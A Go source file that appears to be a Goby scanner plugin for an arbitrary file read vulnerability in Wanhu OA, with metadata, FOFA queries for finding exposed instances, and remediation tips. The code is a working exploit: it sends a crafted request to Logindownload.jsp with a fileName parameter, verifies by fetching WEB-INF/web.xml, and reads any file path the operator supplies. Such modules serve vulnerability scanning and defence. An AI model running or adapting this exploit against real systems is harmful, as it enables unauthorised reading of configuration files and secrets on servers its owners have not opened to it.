package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WanhuOA /defaultroot/public/edit/logindownload/Logindownload.jsp File Read Vulnerability",
    "Description": "<p>Wanhu OA is a software designed by Wanhu Network Technology Co., Ltd. It covers a comprehensive common office platform for common office, information full relationship, and various business systems.  </p><p>wanhuOA has a file read vulnerability. An attacker can construct a special URL to read sensitive information about the system.</p>",
    "Product": "WanhuOA",
    "Homepage": "https://www.whir.net/",
    "DisclosureDate": "2024-08-30",
    "PostTime": "2024-09-11",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/defaultroot/scripts/\" && (body=\"/defaultroot/template/css/\" || body=\"/defaultroot/js/cookie.js\" || body=\"/defaultroot/sp/login.jsp\" || body=\"/defaultroot/ipad/\" ||body=\"/defaultroot/scripts/main/whir.validation.js\"|| header=\"OASESSIONID\")",
    "GobyQuery": "body=\"/defaultroot/scripts/\" && (body=\"/defaultroot/template/css/\" || body=\"/defaultroot/js/cookie.js\" || body=\"/defaultroot/sp/login.jsp\" || body=\"/defaultroot/ipad/\" ||body=\"/defaultroot/scripts/main/whir.validation.js\"|| header=\"OASESSIONID\")",
    "Level": "1",
    "Impact": "<p>wanhuOA has a file read vulnerability. An attacker can construct a special URL to read sensitive information about the system.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_43567873/article/details/137795303"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "WEB-INF/web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "万户OA /defaultroot/public/edit/logindownload/Logindownload.jsp 文件读取漏洞",
            "Product": "万户OA",
            "Description": "<p>万户 OA 是万户网络技术有限公司OA设计的一款软件。他涵盖了共同办公、信息充分关系、各种业务系统的综合共同办公平台。&nbsp;<br></p><p>万户OA存在文件读取漏洞。攻击者通过构造特殊URL地址，可以读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>万户OA存在文件读取漏洞。攻击者通过构造特殊URL地址，可以读取系统敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "两高一弱",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "WanhuOA /defaultroot/public/edit/logindownload/Logindownload.jsp File Read Vulnerability",
            "Product": "WanhuOA",
            "Description": "<p>Wanhu OA is a software designed by Wanhu Network Technology Co., Ltd. It covers a comprehensive common office platform for common office, information full relationship, and various business systems.&nbsp;&nbsp;</p><p>wanhuOA has a file read vulnerability. An attacker can construct a special URL to read sensitive information about the system.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>wanhuOA has a file read vulnerability. An attacker can construct a special URL to read sensitive information about the system.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "2H1W",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`
	postOrGet_zasqefasf123asdfafe1412afdawaq := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/defaultroot/public/edit/logindownload/Logindownload.jsp;?fileName=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/defaultroot/public/edit/logindownload/Logindownload.jsp;?fileName=WEB-INF/web.xml"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"WEB-INF/web.xml": "<web-app",
			}
			// 函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"string": {"WEB-INF/web.xml", "<web-app"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
